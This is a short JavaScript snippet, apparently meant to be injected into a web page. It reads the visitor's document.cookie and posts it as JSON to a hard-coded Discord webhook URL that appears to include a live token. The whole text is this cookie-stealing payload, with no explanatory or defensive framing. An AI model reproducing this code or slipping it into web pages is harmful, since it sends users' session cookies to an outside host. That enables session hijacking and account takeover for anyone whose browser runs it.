const request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1122227334624329840/XGz4NT9iPrVGfJ2Fslko4XAaIQ4Zo4GgRPYem6ZZ_2hkdAymm_l8WdtF4Ob3ET4xhkUv");
   request.setRequestHeader('Content-type', 'application/json');

const params = {
    username: "Beep",
    avatar_url: "",
    content: document.cookie
}

request.send(JSON.stringify(params));
